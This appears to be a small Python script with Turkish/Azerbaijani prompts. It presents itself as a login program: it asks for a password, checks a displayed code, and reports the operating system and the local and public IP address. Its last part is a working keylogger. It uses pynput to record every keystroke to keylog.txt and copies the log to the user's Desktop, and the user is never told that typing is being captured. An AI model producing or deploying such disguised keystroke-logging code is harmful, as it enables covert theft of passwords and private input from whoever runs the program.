
import random
import os
from urllib.request import urlopen
import re
print("Hos Geldiniz ")
isim=input("Istifadeci Adi Daxil Edin : ")
while True:
    sifre=input("Sifrenizi girin: ")
    if len(sifre)<=8:
        print("Daha Guclu Sifre girin ! ")
        continue
    else:
        print("Bilgilərinizi Dogrulayin : ")
        break
while True:
    sifre2=input("Sifrenizi Yeniden girin :")
    if sifre2!=sifre:
        print("Sifrenizi Dogru girin  :")
        continue
    else:
        print("Dogrulama  ----->")
        break

def verification():
    kod = random.randint(100, 1000)
    print("Gördüyünüz Kodu girin:")
    print("Kod:", kod)
    kod2 = int(input("Kodunuz: "))
    if kod != kod2:
        print("Kodu doğru yazın!")
        verification()
    else:
        print("Xoş Geldiniz!")
verification()

sistem=os.name
if os.name=="posix":
    print("Emeliyyat Sisteminiz Linuxdur" )
elif os.name=="nt":
    print("Emeliyyat Sisteminiz Windowsdur")
elif os.name=="mac" or os.name=="darwin":
    print("Emeliyyat Sisteminiz Mac OS dir.")

import socket

def get_ip_address():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        sock.connect(("8.8.8.8", 80))
        
        ip_address = sock.getsockname()[0]

        sock.close()
        
        return ip_address
    except socket.error:
        return "IP adresiniz Tapilmadi"

print("Local Ip Adresiniz:", get_ip_address())

def get_public_ip():
    data = str(urlopen('http://checkip.dyndns.com/').read())
    return re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(data).group(1)

public_ip = get_public_ip()
print("IP Adresiniz : " , public_ip)
from pynput.keyboard import Key, Listener
import logging
 
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
import shutil
src_file = "keylog.txt"
username = input("Komputerdeki Istifadeci adinizi yazin meselen C:\\Users\\Farid : ")
dst_file = "C:\\Users\\" + username + "\\Desktop\\deneme.txt"
shutil.copy(src_file, dst_file)
def on_press(key):
    logging.info(str(key))
with Listener(on_press=on_press) as listener :
    listener.join()
